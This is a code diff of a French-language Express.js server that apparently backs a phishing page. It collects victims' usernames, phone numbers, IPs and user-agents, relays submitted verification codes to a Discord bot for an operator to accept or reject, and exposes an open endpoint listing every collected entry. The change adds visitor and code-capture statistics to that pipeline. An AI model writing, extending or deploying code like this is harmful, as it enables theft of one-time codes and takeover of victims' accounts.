@@ -2,17 +2,56 @@ require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
-
 const { users } = require('./store');
-const { sendInitialEmbed, sendCodeEmbed } = require('./bot');
+const { sendInitialEmbed, sendCodeEmbed, updateStats } = require('./bot');
 const { detectOperator } = require('./operators');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// ======================= STATISTIQUES =======================
+const stats = {
+  totalVisits: 0,
+  currentVisitors: 0,
+  totalRegistrations: 0,
+  totalCodesSubmitted: 0,
+  codesAccepted: 0,
+  codesRejected: 0,
+  lastVisit: null,
+  lastRegistration: null,
+  startTime: Date.now()
+};
+
+// Fonction pour obtenir les stats (utilisée par bot.js)
+function getStats() {
+  return stats;
+}
+
+// ======================= MIDDLEWARE =======================
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
+
+// Middleware pour tracker les visites
+app.use((req, res, next) => {
+  if (req.path === '/' || req.path === '/index.html') {
+    stats.totalVisits++;
+    stats.currentVisitors++;
+    stats.lastVisit = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+    
+    // Mettre à jour l'embed Discord
+    updateStats(stats);
+    
+    // Décrémenter après 5 minutes d'inactivité
+    setTimeout(() => {
+      if (stats.currentVisitors > 0) {
+        stats.currentVisitors--;
+        updateStats(stats);
+      }
+    }, 5 * 60 * 1000);
+  }
+  next();
+});
 
 function getClientIp(req) {
   return (
@@ -25,21 +64,17 @@ function getClientIp(req) {
 }
 
 // ======================= ROUTES =======================
-
 app.post('/api/v1/submit', async (req, res, next) => {
   try {
     const { username, phone } = req.body;
+
     if (!username || !phone) {
       return res.status(400).json({ error: 'Données manquantes' });
     }
 
     const ip = getClientIp(req);
     const userAgent = req.headers['user-agent'] || 'User-Agent inconnu';
-
-    const operatorData = detectOperator(phone) || {
-      operator: 'Inconnu',
-      color: '#999999'
-    };
+    const operatorData = detectOperator(phone) || { operator: 'Inconnu', color: '#999999' };
 
     users[username] = {
       phone,
@@ -53,6 +88,12 @@ app.post('/api/v1/submit', async (req, res, next) => {
     };
 
     await sendInitialEmbed(username, phone);
+    
+    // Mise à jour des stats
+    stats.totalRegistrations++;
+    stats.lastRegistration = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+    updateStats(stats);
+
     res.json({ success: true });
   } catch (err) {
     next(err);
@@ -73,6 +114,11 @@ app.post('/api/v1/verify', async (req, res, next) => {
     user.status = 'pending';
 
     await sendCodeEmbed(username);
+    
+    // Mise à jour des stats
+    stats.totalCodesSubmitted++;
+    updateStats(stats);
+
     res.json({ success: true });
   } catch (err) {
     next(err);
@@ -82,25 +128,21 @@ app.post('/api/v1/verify', async (req, res, next) => {
 app.get('/api/v1/status/:username', (req, res) => {
   const user = users[req.params.username];
   if (!user) return res.status(404).json({ error: 'Introuvable' });
-
   res.json({ status: user.status });
 });
 
 app.get('/api/v1/stats/operators', (req, res) => {
   const operatorStats = {};
-
   Object.values(users).forEach(user => {
     const op = user.operator || 'Inconnu';
     operatorStats[op] = (operatorStats[op] || 0) + 1;
   });
-
   res.json(operatorStats);
 });
 
 app.get('/api/v1/users', (req, res) => {
   const page = parseInt(req.query.page) || 1;
   const limit = parseInt(req.query.limit) || 10;
-
   const allUsers = Object.entries(users).map(([username, data]) => ({
     username,
     ...data
@@ -121,14 +163,15 @@ app.get('/api/v1/users', (req, res) => {
 });
 
 // ======================= ERRORS =======================
-
 app.use((err, req, res, next) => {
   console.error('❌ ERREUR API:', err);
   res.status(500).json({ error: 'Internal server error' });
 });
 
-// ======================= LISTEN (OBLIGATOIRE) =======================
-
+// ======================= LISTEN =======================
 app.listen(PORT, () => {
   console.log(`🌐 API Express lancée sur le port ${PORT}`);
 });
+
+// Exporter les fonctions de stats pour bot.js
+module.exports = { getStats, stats };
